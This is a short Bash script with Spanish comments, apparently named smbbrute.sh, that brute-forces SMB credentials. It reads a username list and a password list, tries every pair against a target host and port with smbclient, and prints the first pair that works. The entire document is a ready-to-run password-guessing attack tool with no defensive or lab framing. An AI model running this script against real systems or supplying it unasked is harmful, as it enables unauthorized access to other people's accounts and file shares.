#!/bin/bash

userfile=$1
paswfile=$2
host=$3
port=$4

# Mensaje de inicio
echo "Iniciando el script de fuerza bruta SMB..."
echo "Host: $host"
echo "Puerto: $port"
echo "Procesando archivos de usuarios y contrase\u00f1as..."

# Validaci\u00f1 de los par\u00e1metros
if [ -z "$host" ] || [ -z "$userfile" ] || [ -z "$paswfile" ]; then
    echo "Error: Faltan par\u00e1metros. Uso: ./smbbrute.sh usuario.txt contrase\u00f1as.txt direccion host puerto"
    exit 1
fi

# Preparar para la b\u00fasqueda
echo "Leyendo usuarios y contrase\u00f1as..."
while read psw; do
    while read usr; do
        # Mostrar progreso en la consola
        echo "[+] Probando usuario: '$usr' con contrase\u00f1a: '$psw'"
        
        # Ejecutar el comando smbclient
        smbclient -L "$host" -U "$usr%$psw" -p "$port" > /dev/null 2>&1
        
        if [ $? -eq 0 ]; then
            echo "[+] \u00a1\u00c9xito! Usuario: $usr Contrase\u00f1a: $psw"
            exit 0
        else
            echo "[-] Fallido: Usuario: '$usr' Contrase\u00f1a: '$psw'"
        fi
    done < "$userfile"
done < "$paswfile"

echo "[!] Proceso completado. No se encontraron credenciales v\u00e1lidas."
exit 0
